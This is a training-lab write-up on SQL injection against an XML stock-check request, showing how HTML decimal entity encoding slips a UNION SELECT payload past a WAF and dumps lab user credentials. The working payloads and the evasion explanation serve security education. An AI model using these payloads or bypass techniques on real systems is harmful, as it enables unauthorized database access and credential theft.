# Lab: SQL injection with filter bypass via XML encoding

### Instructions

This lab contains a SQL injection vulnerability in its stock check feature. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables.

The database contains a users table, which contains the usernames and passwords of registered users. To solve the lab, perform a SQL injection attack to retrieve the admin user's credentials, then log in to their account. 

### Solution

Clicking on an item and intercepting the "Check stock" request in Burp we find the application is using XML:

```xml
<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```
Testing the `storeId` filed for SQL injection, we find there is a WAF in place:

```xml
<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>1</productId><storeId>1' OR 1=1-- -</storeId></stockCheck>
```

Response:

```
HTTP/2 403 Forbidden
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 17

"Attack detected"
```

We can use the plugin Hackvertor https://github.com/portswigger/hackvertor to begin testing encoded payloads.


We can use the dec_entities feature in Hackvertor to generate a payload we can use to access the `username` and `password` columns in the `users` table:

```sql
<@dec_entities>1 UNION SELECT username || ':' || password FROM users</@dec_entities>
```

```xml
<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>1</productId><storeId><@dec_entities>1 UNION SELECT username || ':' || password FROM users</@dec_entities></storeId></stockCheck>
```

Which returns the administrator credentials, which can be used to login and complete the lab:

```
HTTP/2 200 OK
Content-Type: text/plain; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 99

98 units
administrator:q8qiumiq38lwvcc9tsig
wiener:ul4yu89socw700btkzr2
carlos:5f1jiocn6lgf132dbpm0
```

### Concepts Covered
- UNION-based SQL injection via XML body parameter
- WAF detection and evasion via XML entity encoding
- HTML decimal entity encoding as an obfuscation technique
- Concatenating multiple columns with || for single-column extraction
- Full attack chain: data extraction through to authenticated login

---

### Why XML Encoding Bypasses the WAF
The WAF inspects the raw request body for SQL keywords like UNION and SELECT.
By encoding the payload as HTML decimal entities (e.g. `U = &#85;`, `N = &#78;`),
the raw bytes the WAF sees contain no recognizable SQL keywords, just numeric
references. The XML parser on the backend then decodes the entities back into
plain text before passing the value to the SQL query, so the database receives
a valid UNION SELECT statement. The WAF never sees it.

This technique works because the decoding happens after WAF inspection —
the WAF and the XML parser are operating on different representations of
the same data.

---

### Automation
Solved via Python script — see sqli_18.py

The script encodes the UNION payload as decimal entities, posts it as XML
to the stock check endpoint, parses the administrator password from the
response, then completes the full attack chain by logging in as administrator.

```
python3 sqli_18.py <LAB_URL>
```
---

### Takeaways
- WAFs operate on raw bytes,  encoding exploits the gap between what the WAF
  sees and what the backend parser interprets
- XML entity encoding is one of many encoding layers that can be abused this
  way — HTML encoding, Unicode escapes, and double encoding are others
- The attack surface isn't always a URL parameter. XML bodies, JSON bodies,
  and HTTP headers are all valid injection points
- Hackvertor automates encoding transformations that would be tedious manually